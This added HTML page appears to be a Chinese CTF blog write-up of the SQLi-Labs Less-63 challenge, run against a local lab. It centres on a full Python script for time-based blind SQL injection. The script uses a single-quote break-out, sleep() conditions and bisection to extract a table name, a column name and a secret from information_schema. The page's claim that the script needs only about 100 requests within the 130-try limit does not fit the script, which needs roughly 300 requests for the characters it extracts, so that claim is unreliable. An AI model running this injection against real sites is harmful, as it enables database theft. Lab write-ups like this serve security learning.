@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-63 Challenge-10 时间盲注自动化 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-63 Challenge-10 时间盲注自动化 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 时间盲注, Python自动化, Challenge</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入 Challenge 系列</li>
+        <li><strong>题目名称：</strong>Less-63 (Challenge-10)</li>
+        <li><strong>提示：</strong>目标是从 <code>challenges</code> 库中提取密钥，限制 130 次尝试。无报错、无回显，闭合符为单引号 <code>'</code>。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡与 L62 属于同一类型的纯盲注环境。页面无数据回显且无 SQL 错误提示，必须通过 <b>时间盲注（Time-based Blind SQLi）</b> 配合 <code>sleep()</code> 函数来建立真假判断通道。</p>
+    <p><strong>核心区别：</strong>上下文闭合方式变为单引号 <code>id='$id'</code>。需要在 Payload 构造时更改闭合符。为在 130 次限制内完成提取，继续使用二分法（Bisection）脚本。</p>
+
+    <h2>3. 操作步骤与代码解析</h2>
+    
+    <p><strong>第一步：编写并运行 Python 自动化脚本</strong></p>
+    <p>由于纯盲注环境手工测试极易超时，直接编写脚本进行二分法爆破。</p>
+
+    <pre><code>import requests
+import time
+
+url = "http://localhost/sqli-labs-master/Less-63/"
+# 延时阈值（1.5秒），过滤网络抖动
+delay_threshold = 1.5 
+
+def check_true(payload):
+    # 核心修改：闭合符变为单引号 '
+    full_url = f"{url}?id=1' and ({payload})--+"
+    try:
+        start = time.time()
+        requests.get(full_url, timeout=10)
+        return (time.time() - start) &gt; delay_threshold
+    except requests.exceptions.Timeout:
+        return True
+
+def get_char(expr, pos):
+    """二分法猜解单个字符"""
+    low = 32
+    high = 126
+    while low &lt;= high:
+        mid = (low + high) // 2
+        # 核心判断：如果 ASCII 码大于 mid，睡 2 秒
+        payload = f"if(ascii(substr({expr},{pos},1))&gt;{mid},sleep(2),0)"
+        if check_true(payload):
+            low = mid + 1
+        else:
+            high = mid - 1
+    return low
+
+def extract(expr, length):
+    """逐字符提取"""
+    result = ""
+    for i in range(1, length + 1):
+        code = get_char(expr, i)
+        # 遇到不可见字符直接跳出
+        if code &lt;= 32 or code &gt; 126:
+            break
+        result += chr(code)
+        print(f"\r[*] 当前结果: {result}", end="", flush=True)
+    print()
+    return result
+
+if __name__ == "__main__":
+    print("[*] 开始 L63 时间盲注二分法提取...")
+    
+    print("[*] 正在提取表名...")
+    table = extract("(select table_name from information_schema.tables where table_schema='challenges' limit 1)", 12)
+    print(f"[+] 表名: {table}")
+    
+    print("[*] 正在提取密钥列名...")
+    col = extract("(select column_name from information_schema.columns where table_schema='challenges' and column_name like 'secret%' limit 1)", 16)
+    print(f"[+] 列名: {col}")
+    
+    print("[*] 正在提取最终密钥...")
+    secret = extract(f"(select {col} from challenges.{table} limit 1)", 24)
+    print(f"[+] 最终密钥: {secret}")</code></pre>
+
+    <p><strong>代码成分解析：</strong></p>
+    <ul>
+        <li><code>full_url = f"{url}?id=1' and ({payload})--+"</code>：针对 L63 的单引号闭合上下文。</li>
+        <li><code>if(ascii(substr(...))&gt;{mid}, sleep(2), 0)</code>：二分法核心条件。若成立则休眠 2 秒。</li>
+        <li><code>time.time() - start &gt; 1.5</code>：判断请求是否超时。1.5 秒的阈值有效规避了本地网络波动（如 0.6s 延迟）导致的误判。</li>
+    </ul>
+
+    <p><strong>第二步：执行结果与提交</strong></p>
+    <p>终端成功输出：表名 <code>iznldas72y</code>，列名 <code>secret_KD9I</code>，最终密钥 <code>5QaY99S4epINVw0cqk15mgT</code>。</p>
+    <p>将密钥提交至页面底部输入框，页面弹出 <code>CONGRATS YOU NAILED IT</code>，通关成功。</p>
+
+    <h2>4. 策略复盘</h2>
+    <ul>
+        <li><strong>脚本的复用性：</strong>在 Challenge 纯盲注关卡中，不同关卡的核心区别仅在于“闭合符”和“URL”。二分法逻辑、时间阈值判断、退出条件可以完全复用。</li>
+        <li><strong>效率与限制的博弈：</strong>130 次的尝试限制对于手工测试是噩梦，但对于二分法脚本（约 100 次请求）刚好在安全范围内。精准计算请求次数是通关的关键。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>单引号时间盲注</strong>：在无回显环境下的基础闭合与盲注手法。</li>
+        <li><strong>二分法代码复用</strong>：通过参数化 URL 和 Payload 模板，实现一套代码通杀多关。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
